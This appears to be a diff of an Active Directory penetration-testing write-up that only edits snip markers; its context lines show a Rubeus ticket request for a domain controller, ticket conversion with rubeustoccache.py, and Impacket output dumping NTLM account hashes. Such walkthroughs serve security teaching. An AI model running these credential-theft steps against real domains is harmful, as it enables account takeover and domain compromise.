@@ -203,7 +203,7 @@ PS C:\programdata> .\rubeus.exe asktgs /service:cifs/dc01.example.com /domain:EX
 [+] Ticket successfully imported!
 [*] base64(ticket.kirbi):
 
-      doIFAjCCBP ...[SNIP]... 9zdC5odGI=
+      doIFAjCCBP ---[SNIP]--- 9zdC5odGI=
 
   ServiceName              :  cifs/dc01.example.com
   ServiceRealm             :  EXAMPLE.COM
@@ -235,7 +235,7 @@ python3 rubeustoccache.py '<BASE64_TICKET>' administrator.kirbi administrator.cc
 ```
 
 ```console {class="sample-code"}
-$ python3 rubeustoccache.py 'doIFAjCCBP ...[SNIP]... 9zdC5odGI=' administrator.kirbi administrator.ccache
+$ python3 rubeustoccache.py 'doIFAjCCBP ---[SNIP]--- 9zdC5odGI=' administrator.kirbi administrator.ccache
 
 ╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
 ╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
@@ -272,7 +272,7 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:ac2b5f88fc33b7b9e0682be85784ec0d:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:59920e994636168744039017dcf49e54:::
-...[SNIP]...
+---[SNIP]---
 ```
 
 <small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>
